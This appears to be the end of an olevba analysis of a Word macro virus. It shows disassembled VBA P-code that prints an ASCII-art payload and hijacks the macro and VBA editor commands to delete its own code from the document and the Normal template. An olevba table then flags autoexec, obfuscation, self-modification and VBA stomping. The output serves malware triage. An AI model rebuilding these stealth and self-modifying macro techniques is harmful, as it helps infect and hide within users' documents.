' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #179:
' 	Ld Sweety 
' 	LitStr 0x002B "                       MMM::::::::::::::::M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #180:
' 	Ld Sweety 
' 	LitStr 0x002B "                       MMM::::::::::::::::M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #181:
' 	Ld Sweety 
' 	LitStr 0x002C "                       MMM::::::::::::::::Mm"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #182:
' 	Ld Sweety 
' 	LitStr 0x002C "                        MM::::::::::::::::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #183:
' 	Ld Sweety 
' 	LitStr 0x002C "                        MMM:::::::::::::::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #184:
' 	Ld Sweety 
' 	LitStr 0x002C "                        MMM:::::::::::::::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #185:
' 	Ld Sweety 
' 	LitStr 0x002C "                        MMM:::::::::::::::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #186:
' 	Ld Sweety 
' 	LitStr 0x002C "                        MMM:::::::::::::::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #187:
' 	Ld Sweety 
' 	LitStr 0x002C "                         MM::::::::::::::MMM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #188:
' 	Ld Sweety 
' 	LitStr 0x002B "                         MMM:::::::::::::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #189:
' 	Ld Sweety 
' 	LitStr 0x002B "                         MMM:::::::::::::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #190:
' 	Ld Sweety 
' 	LitStr 0x002A "                         MMM::::::::::::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #191:
' 	Ld Sweety 
' 	LitStr 0x002A "                          MM::::::::::::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #192:
' 	Ld Sweety 
' 	LitStr 0x002A "                          MM::::::::::::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #193:
' 	Ld Sweety 
' 	LitStr 0x0029 "                          MM:::::::::::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #194:
' 	Ld Sweety 
' 	LitStr 0x0029 "                          MMM::::::::::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #195:
' 	Ld Sweety 
' 	LitStr 0x0029 "                          MMM::::::::::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #196:
' 	Ld Sweety 
' 	LitStr 0x0028 "                           MM:::::::::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #197:
' 	Ld Sweety 
' 	LitStr 0x0028 "                           MMM::::::::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #198:
' 	Ld Sweety 
' 	LitStr 0x0027 "                            MMM::::::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #199:
' 	Ld Sweety 
' 	LitStr 0x0027 "                             MM::::::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #200:
' 	Ld Sweety 
' 	LitStr 0x0027 "                              MM:::::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #201:
' 	Ld Sweety 
' 	LitStr 0x0028 "                              MM:::::M:M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #202:
' 	Ld Sweety 
' 	LitStr 0x0028 "                              :M::::::M:"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #203:
' 	Ld Sweety 
' 	LitStr 0x0028 "                            M:::M::::::M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #204:
' 	Ld Sweety 
' 	LitStr 0x0029 "                          M:::::M:::::::M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #205:
' 	Ld Sweety 
' 	LitStr 0x002A "                         M::::::MM:::::::M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #206:
' 	Ld Sweety 
' 	LitStr 0x002B "                         M:::::::M::::::::M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #207:
' 	Ld Sweety 
' 	LitStr 0x002C "                         M;:;::::M:::::::::M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #208:
' 	Ld Sweety 
' 	LitStr 0x002D "                         M:m:;:::M::::::::::M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #209:
' 	Ld Sweety 
' 	LitStr 0x002D "                         MM:m:m::M::::::::;:M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #210:
' 	Ld Sweety 
' 	LitStr 0x002D "                          MM:m::MM:::::::;:;M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #211:
' 	Ld Sweety 
' 	LitStr 0x002D "                           MM::MMM::::::;:m:M"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #212:
' 	Ld Sweety 
' 	LitStr 0x002D "                            MMMM MM::::m:m:MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #213:
' 	Ld Sweety 
' 	LitStr 0x002C "                                  MM::::m:MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #214:
' 	Ld Sweety 
' 	LitStr 0x002B "                                   MM::::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #215:
' 	Ld Sweety 
' 	LitStr 0x002A "                                    MM::MM"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Sweety 
' Line #216:
' Line #217:
' 	LitDI2 0x0004 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #218:
' 	LitStr 0x000B "Courier New"
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt New 
' Line #219:
' 	Ld Selection 
' 	ArgsMemCall MoveEnd 0x0000 
' Line #220:
' 	Ld Sweety 
' 	Ld Selection 
' 	MemSt Then 
' Line #221:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #222:
' 	Ld Selection 
' 	ArgsMemCall Delete 0x0000 
' Line #223:
' 	EndSub 
' Line #224:
' Line #225:
' 	FuncDefn (Sub ViewVBCode())
' Line #226:
' 	OnError (Resume Next) 
' Line #227:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #228:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #229:
' 	EndWith 
' Line #230:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #231:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #232:
' 	EndWith 
' Line #233:
' Line #234:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0005 "Relax"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #235:
' 	Ld NormalTemplate 
' 	MemLd New 
' 	LitStr 0x0005 "Relax"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #236:
' 	LitVarSpecial (True)
' 	St ShowVisualBasicEditor 
' Line #237:
' 	EndSub 
' Line #238:
' Line #239:
' 	FuncDefn (Sub ToolsMacro())
' Line #240:
' 	OnError (Resume Next) 
' Line #241:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #242:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #243:
' 	EndWith 
' Line #244:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #245:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #246:
' 	EndWith 
' Line #247:
' Line #248:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0005 "Relax"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #249:
' 	Ld NormalTemplate 
' 	MemLd New 
' 	LitStr 0x0005 "Relax"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #250:
' 	Ld wdDialogToolsMacro 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Display 0x0000 
' Line #251:
' 	EndSub 
' Line #252:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

